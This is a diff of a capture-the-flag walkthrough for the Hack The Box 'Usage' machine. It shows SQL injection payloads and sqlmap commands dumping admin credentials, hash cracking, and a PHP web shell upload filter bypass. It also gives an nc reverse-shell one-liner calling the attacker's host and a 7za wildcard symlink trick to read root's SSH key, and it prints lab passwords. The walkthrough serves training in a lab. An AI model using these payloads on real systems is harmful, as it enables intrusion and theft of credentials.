@@ -5,8 +5,15 @@ tags:
   - htb
   - linux
   - easy
+  - sudoers
+  - laravel
+  - sqlmap
+  - sqli
+  - file-upload
+  - wildcard
+  - 7z
 ---
-Picture here
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/Usage.png)
 
 ## Information Gathering
 ### Rustscan
@@ -44,21 +51,21 @@ Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
 
 After adding **usage.htb** to `/etc/hosts`, we can access the website:
 
-pic here
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u5.png)
 
 **Admin** directs us to **admin.usage.htb**, which I also add to `/etc/hosts`:
 
-![alt text](image.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image.png)
 
 **Reset Password** directs to `/forget-password`, and we can submit email address to reset password:
 
-pic here
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u1.png)
 
 ## Laravel SQLi
 
 **Wappalyzer** shows that **Laravel** is running on the website:
 
-wappalzyer ss
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u4.png)
 
 [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel) provides detailed guides on exploiting Laravel.
 
@@ -68,11 +75,11 @@ Testing all possible entry points, `/forget-password` email paramenter is found 
 
 Let's first intercept request for reset password using Burp Suite:
 
-![alt text](image-3.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-3.png)
 
 Using [this list](https://github.com/payloadbox/sql-injection-payload-list?tab=readme-ov-file#generic-error-based-payloads) for fuzzing the email paramenter, it seems that length of 7729 is a redirection page and length of 1616 is 500 error page:
 
-![alt text](image-7.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-7.png)
 
 ### SQLi Detection
 
@@ -80,128 +87,160 @@ Let's try identifying the number of columns.
 
 Submitting `a' ORDER BY 8;-- -` will direct us to redirection page:
 
-![alt text](image-5.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-5.png)
 
 Submitting `a' ORDER BY 9;-- -` shows Server Error, indicating there's 8 columns:
 
-![alt text](image-6.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-6.png)
 
 
 ### SQLMap
 
-Let's automate the exploitation using sqlmap and set the paramenter email to be vulnerbale:
-
-`sqlmap -r forget-pass-req.txt -p email --dbs --batch`
-
-
-
-Let's try again after setting the risk level as such:
+Let's automate the exploitation using sqlmap and set the parameter email to be vulnerable:
 
 `sqlmap -r forget-pass-req.txt -p email --batch --level 5 --risk 3 --dbs`
 
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u3.png)
 
-Scan is very slow, but it still identifies email parameter being vulnerable and discovers MySQL running in the background. 
+Database **usage_blog** seems interesting. Let's look more into it.
 
 `sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog --tables`
 
-`sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog -T admin_users --dump`
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u2.png)
 
-
-`sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog -T admin_users --columns`
-
-
+Using the below command to dump data inside **admin_users** table, we can obtain password hash for the user **admin**:
 
 `sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog -T admin_users --dump`
+
+
+After obtaining the password hash, we crack it using hashcat as such:
+
+`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcryptbas`
+
+Password is cracked to be **whatever1**.
+
 
 
 ## Shell as dash
 ### admin.usage.htb
 
-Using the cracked password, we can successfully signin to the dashboard:
+Using the cracked password, we can successfully sign-in to the dashboard:
 
-![alt text](image-1.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-1.png)
 
 At the bottom right, Laravel version is shown: **1.8.17**
 
-![alt text](image-11.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-11.png)
 
 ### File Upload
 
-Googling for Larval 1.8.17 exploit, we come accross [File Upload Vulnerability](https://www.exploit-db.com/exploits/49112).
+Googling for **Larval 1.8.17** exploit, we come across [File Upload Vulnerability](https://www.exploit-db.com/exploits/49112).
+
+Let's try uploading malicious files using the profile page's avatar image upload feature:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-13.png)
 
 
-
-![alt text](image-13.png)
-
+In order to bypass the blacklist filter, I will upload [p0wny shell](https://github.com/flozz/p0wny-shell) as **pown.jpg.php**:
 
 
-https://github.com/pentestmonkey/php-reverse-shell
-
-![alt text](image-12.png)
-
-http://admin.usage.htb/uploads/images/rev_shell.jpg.php?cmd=id
-
-<?php system(?_REQUEST["cmd"]); ?>
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-16.png)
 
 
-![alt text](image-14.png)
+Through, `http://admin.usage.htb/uploads/images/pown.jpg.php`, we now have p0wny shell as the user **dash**:
 
-![alt text](image-15.png)
-
-# real
-
-pown
-
-![alt text](image-16.png)
-
-http://admin.usage.htb/uploads/images/pown.jpg.php
-
-![alt text](image-17.png)
-
-www.revshells.com
-
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.29 1337 >/tmp/f
-
-![alt text](image-18.png)
-
-![alt text](image-19.png)
-
-![alt text](image-20.png)
-
-3nc0d3d_pa$$w0rd
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-17.png)
 
 
-![alt text](image-21.png)
+Let's generate reverse shell payload using [revshell](www.revshells.com) and run it on p0wny shell:
 
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.29 1337 >/tmp/f`
+
+On our local netcat listener, we get a revere shell connection as the user **dash**:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-18.png)
+
+## Privesc: dash to xander
+
+Let's first take a look at the files inside the home directory:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-19.png)
+
+There are several uncommon files such as **.monit.id** and **.monitrc**.
+
+Taking a look into **.monitrc**, we obtain potential password for other users: `3nc0d3d_pa$$w0rd`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-20.png)
+
+
+Let's see what other users on this system through `cat /etc/passwd | grep /home`:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-21.png)
+
+
+It seems like  **syslog** and **xander** users are also on the system.
+
+Trying SSH for both users with the potential password, there's a match for **xander** and we can now SSH inside:
 
 `sudo ssh xander@usage.htb`
 
-![alt text](image-22.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-22.png)
 
-![alt text](image-23.png)
+## Privesc: xander to root
+
+### Sudoers
+
+Let's first check whether there is  file that could be ran with root privilege using `sudo -l`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-23.png)
+
+`/usr/bin/usage_management` could be ran with root privilege.
+
+Let's take a look in the file using `strings`:
 
 `strings /usr/bin/usage_management`
 
-![alt text](image-24.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-24.png)
+
+There are couple of lines that catches our attention.
+
+`7za` (7-Zip) tool is being used to create a ZIP archive of files in the current directory:
 
 `/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *`
 
+ mysqldump is being used to create a backup of all databases in a MySQL server:
+
 `/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql`
 
-https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
+### Wildcards Spare tricks
 
-![alt text](image-25.png)
+After spending some time googling, it seems like `/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *` is vulnerable to [Wildcards Spare trick](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks):
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-25.png)
+
+On `/var/www/html` page, we will first create a **id_rsa** file and link it to `/root/.ssh/id_rsa`:
+
+```bash
+touch @id_rsa
+ln -s /root/.ssh/id_rsa id_rsa
+```
 
 
-![alt text](image-27.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-27.png)
 
-![alt text](image-28.png)
+Now, let's run `/usr/bin/usage_management` with sudo:
 
-![alt text](image-29.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-28.png)
+
+At the end of the command output, we can see that root's id_rsa key is being printed:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-29.png)
+
+Using the above id_rsa key, we can sign-in to the system as the root:
 
 `ssh -i id_rsa root@usage.htb`
 
-![alt text](image-26.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-26.png)
 
 
 
